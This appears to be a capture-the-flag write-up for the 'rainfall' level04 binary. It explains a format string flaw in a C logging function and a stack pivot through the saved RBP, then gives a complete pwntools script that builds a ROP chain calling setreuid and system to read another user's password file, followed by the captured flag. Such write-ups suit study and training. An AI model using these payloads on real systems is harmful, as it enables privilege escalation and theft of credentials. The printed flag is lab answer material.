After analyzing the source code, we identify a clear format string vulnerability in the `display_entry` function:

```c
static void display_entry(unsigned int idx)
{
    if (idx >= LOG_ENTRIES)
        return;
    printf("[RIVIERA] [%u] tag=", log_buf[idx].seq);
    printf(log_buf[idx].tag);
    printf(" msg=%s\n", log_buf[idx].message);
}

```

While overwriting an entry in the GOT (Global Offset Table) like `printf` might initially seem viable, standard GOT redirection fails to execute any proper shell command, since we can't gave it a proper command as it first arguments.

Instead, we leverage the format string vulnerability to perform an arbitrary 2-byte write (`%hn`), modifying the saved `RBP` of the caller `handle_input` on the stack. When `handle_input` subsequently reaches its epilogue (`leave; ret`), `RSP` pivots directly into our second user input (`msg`), which contains our staged ROP chain.

The exploit operates in two synchronized steps:

1. **Format String / Stack Pivot Setup (`tag`):**
* Target stack address: `0x7fffffffeb70` (adjusted for runtime environment offsets).
* Format payload: `%60304c%10$hn` writes `0xeb90` into the saved `RBP` slot using the 10th stack argument offset, pointing `RBP` directly into the `msg` buffer containing the ROP chain.


2. **Privileged ROP Chain Execution (`msg`):**
* **`setreuid(1021, 1021)`:** Sets the real and effective user IDs to `flag04` (`UID: 1021`).
* **`system(command)`:** Calls `system()` with the address pointing to our embedded shell command (`cat /home/flag04/.pass > /tmp/.pass`).
* **Stack Alignment (`ret`):** Incorporates `ret` gadgets to maintain strict 16-byte stack alignment required by glibc 64-bit calling conventions.
* **`exit(3)`:** Cleanly terminates the binary without dropping into an unhandled fault.



**`exploit.py`:**

```python
import sys
from pwn import *

libc = 0x7ffff7c00000

# ROP Gadgets
ROP_RDI      = p64(libc + 0x000000000010c08d)  # pop rdi ; ret
ROP_RSI      = p64(libc + 0x0000000000110b7d)  # pop rsi ; ret
ROP_RET      = p64(libc + 0x000000000002882f)  # ret (16-byte alignment)

# Functions & Values
ROP_SYS      = p64(libc + 0x0000000000058750)
ROP_SETREUID = p64(libc + 0x00000000001271d0)
ROP_EXIT     = p64(libc + 0x0000000000047ba0)
OWNER_UID    = p64(1021)

diff = -0x10
target_address = p64(0x7fffffffeb80 + diff)
safe_rbp = p64(0x00007fffffffecb0)

# Build ROP Chain
rop_chain = safe_rbp
rop_chain += safe_rbp
rop_chain += ROP_RET
rop_chain += ROP_RDI + OWNER_UID
rop_chain += ROP_RSI + OWNER_UID
rop_chain += ROP_SETREUID
rop_chain += ROP_RDI
rop_chain += p64(0x7fffffffec10 + diff)  # Points to command string
rop_chain += ROP_RET
rop_chain += ROP_SYS
rop_chain += ROP_RDI
rop_chain += p64(3)
rop_chain += ROP_EXIT

tag = b'%60304c%10$hn'
msg = target_address + rop_chain + b'cat /home/flag04/.pass\x00\n'

payload = tag + b'\n' + msg
sys.stdout.buffer.write(payload)

```

**Execution & Flag Capture:**

```sh
level04@rainfall:~$ env -i bash -c 'cat in.bin | /home/level04/riviera'
                                                                         � msg=p����
x0w8xdgapz3tjopq2s11a27yro7krazm
```